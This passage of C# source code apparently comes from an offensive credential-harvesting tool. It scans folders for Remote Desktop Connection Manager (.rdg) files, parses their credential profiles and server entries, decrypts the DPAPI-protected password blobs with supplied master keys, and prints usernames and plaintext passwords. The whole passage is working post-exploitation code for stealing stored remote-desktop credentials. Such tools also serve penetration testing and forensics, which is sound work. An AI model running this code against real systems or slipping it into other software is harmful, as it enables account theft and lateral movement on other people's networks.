                string domain = credProfileNode["domain"].InnerText.Trim();
                string b64Password = credProfileNode["password"].InnerText;
                string password = "";
                string fullUserName = "";

                if (String.IsNullOrEmpty(domain))
                {
                    fullUserName = userName;
                }
                else
                {
                    fullUserName = String.Format("{0}\\{1}", domain, userName);
                }

                Console.WriteLine("          Profile Name : {0}", profileName);
                Console.WriteLine("            UserName   : {0}", fullUserName);

                byte[] passwordDPAPIbytes = Convert.FromBase64String(b64Password);

                if (passwordDPAPIbytes.Length > 0)
                {
                    byte[] decBytesRaw = Dpapi.DescribeDPAPIBlob(passwordDPAPIbytes, MasterKeys, "rdg", unprotect);

                    if (decBytesRaw.Length != 0)
                    {
                        // chop off anything after the UNICODE end
                        int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
                        if (finalIndex > 1)
                        {
                            byte[] decBytes = new byte[finalIndex + 1];
                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                            password = Encoding.Unicode.GetString(decBytes);
                        }
                        else
                        {
                            password = Encoding.ASCII.GetString(decBytesRaw);
                        }
                    }
                    Console.WriteLine("            Password   : {0}", password);
                }
            }
        }

        public static void TriageRDGFile(Dictionary<string, string> MasterKeys, string rdgFilePath, bool unprotect = false)
        {
            // parses a RDG connection file, decrypting any password blobs as appropriate

            if (System.IO.File.Exists(rdgFilePath))
            {
                Console.WriteLine("\r\n      {0}", rdgFilePath);

                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(rdgFilePath);

                XmlNodeList credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");

                if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
                {
                    Console.WriteLine("\r\n        Cred Profiles");
                }
                foreach (XmlNode credProfileNode in credProfileNodes)
                {
                    Console.WriteLine();
                    DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
                }

                XmlNodeList servers = xmlDoc.GetElementsByTagName("server");

                if ((servers != null) && (servers.Count != 0))
                {
                    Console.WriteLine("\r\n        Servers");
                }

                foreach (XmlNode server in servers)
                {
                    try
                    {
                        if ((server["properties"]["name"] != null))
                        {
                            if (server["properties"]["displayName"] != null)
                            {
                                Console.WriteLine("\r\n          Name         : {0} ({1})", server["properties"]["name"].InnerText, server["properties"]["displayName"].InnerText);
                            }
                            else
                            {
                                Console.WriteLine("\r\n          Name         : {0}", server["properties"]["name"].InnerText);
                            }

                            if (server["logonCredentials"] != null)
                            {
                                DisplayCredProfile(MasterKeys, server["logonCredentials"], unprotect);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception: {0}", e);
                    }
                }
            }
            else
            {
                Console.WriteLine("\r\n      [X] .RDG file '{0}' is not accessible or doesn't exist!", rdgFilePath);
            }
        }

        public static void TriageRDGFolder(Dictionary<string, string> MasterKeys, string folder, bool unprotect)
        {
            // triage a specific RDG folder

            if (System.IO.Directory.Exists(folder))
            {
                string[] systemFiles = Directory.GetFiles(folder);
                if ((systemFiles != null) && (systemFiles.Length != 0))
                {
                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);

                    foreach (string file in systemFiles)
                    {
                        if (file.EndsWith(".rdg"))
                        {
                            try
                            {
                                TriageRDGFile(MasterKeys, file, unprotect);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                            }
                        }
                    }
                }
                else
                {
                    // Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
                }
            }
            else
            {
                // Console.WriteLine("\r\n[X] Folder '{0}' doesn't currently exist!", folder);
            }
        }
    }
}